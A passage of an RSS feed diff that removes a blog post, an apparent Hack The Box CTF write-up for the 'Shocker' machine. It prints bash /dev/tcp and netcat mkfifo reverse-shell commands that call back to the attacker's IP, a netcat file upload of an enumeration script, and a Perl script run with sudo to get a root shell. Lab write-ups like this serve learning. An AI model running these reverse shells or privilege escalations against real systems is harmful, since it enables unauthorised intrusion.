-listening on [any] 1234 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On the server&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.101/1234 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Then I got a shell!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1234
-listening on [any] 1234 ...
-connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 48700
-bash: no job control in this shell
-shelly@Shocker:/usr/lib/cgi-bin$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But ….. this shell was echoing every key typed. I needed a better shell.&lt;/p&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On my machine&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1235
-listening on [any] 1235 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On the server&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc LISTENING-IP LISTENING-PORT &amp;gt; /tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On my machine&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1235
-listening on [any] 1235 ...
-connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 35756
-/bin/sh: 0: can't access tty; job control turned off
-$ id
-uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now the shell was decent. Flags, here I come!&lt;/p&gt;
-
-&lt;h2 id=&quot;getting-the-user-flag-it-was-boring&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; flag (it was boring)&lt;/h2&gt;
-&lt;p&gt;To score the first points, I had to find the &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; file, where the flag was. I took the directly approach:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
-2ec24e11320026d1e70ff3e16695b233&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;That was very easy. Let’s step up the game.&lt;/p&gt;
-
-&lt;h2 id=&quot;getting-the-root-flag-it-was-cool&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag (it was cool)&lt;/h2&gt;
-&lt;p&gt;As my first try, ran the obvious &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; but it didn’t work because the user’s password was unknown.&lt;/p&gt;
-
-&lt;h3 id=&quot;linenum&quot;&gt;LinEnum&lt;/h3&gt;
-&lt;p&gt;So, there is this awesome enumeration script called &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; (that can be found &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;here&lt;/a&gt;). Since the box couldn’t communicate with the outer-world, I had to upload it from my machine and I chose &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to do that.&lt;/p&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On my machine&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233 &amp;lt; LinEnum.sh 
-listening on [any] 1233 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On the server&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/usr/lib/cgi-bin$ cd /tmp
-shelly@Shocker:/tmp$ nc 10.10.15.101 1233 &amp;gt; enum.sh
-shelly@Shocker:/tmp$ sh enum.sh -t -r shocker&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;The produced report was named &lt;code class=&quot;highlighter-rouge&quot;&gt;shocker-04-02-18&lt;/code&gt; and I downloaded it via &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; (that I’ll suppress).&lt;br /&gt;
-Upon reading the report, I saw that &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/perl&lt;/code&gt; could be ran as &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;. At this point, I noticed that I was very close. I could just write a script to print the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag but that would be pretty boring, right? I’d rather get a &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; shell just for fun! And so I came up with this simple script:&lt;/p&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;root.pl&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;#!/bin/perl
-system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.15.101 1233 &amp;gt;/tmp/f&quot;);&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And proceeded to get the desired shell:&lt;/p&gt;
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On my machine&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233
-listening on [any] 1233 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On the server&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/tmp$ sudo /usr/bin/perl root.pl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And finally I was (g)&lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233
-listening on [any] 1233 ...
-connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 40344
-/bin/sh: 0: can't access tty; job control turned off
-# id
-uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Alright, the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag …&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# cat /root/root.txt
-52c2715605d70c7619030560dc1ca467&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h1 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h1&gt;
-&lt;p&gt;It was hard for me to find the entry point, but after that, it was pretty simple. I noticed that sometimes I overcomplicate stuff e.g. I think I could have just set up a perl script with &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;bash&quot;)&lt;/code&gt; and get &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; in the fraction of the time, but I only thought about that hours after. I feel that I lack some enumeration skills and mindset, but that is the purpose of me working on these boxes.&lt;/p&gt;
-
-&lt;p&gt;exit(0);&lt;/p&gt;
-</description>
-				<pubDate>Sat, 03 Feb 2018 22:00:01 -0200</pubDate>
-				<link>/2018/02/htb-ctf-shocker</link>
-				<guid isPermaLink="true">/2018/02/htb-ctf-shocker</guid>
 			</item>
 		
 	</channel>
